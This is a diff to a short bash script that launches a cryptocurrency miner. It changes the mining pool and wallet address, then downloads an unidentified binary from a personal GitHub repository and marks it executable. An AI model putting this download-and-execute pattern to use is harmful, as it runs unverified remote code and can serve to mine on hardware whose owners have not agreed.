@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=s-sg.comining.io:9999
-WALLET=0x6172c0d0139e0ce7431cabceae0f59cd49422166
+POOL=eu.etc.k1pool.com:3821
+WALLET=KrcUkCfHad2tzFXqskx55dpSXqXmCfTrawz
 WORKER=k80
 wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
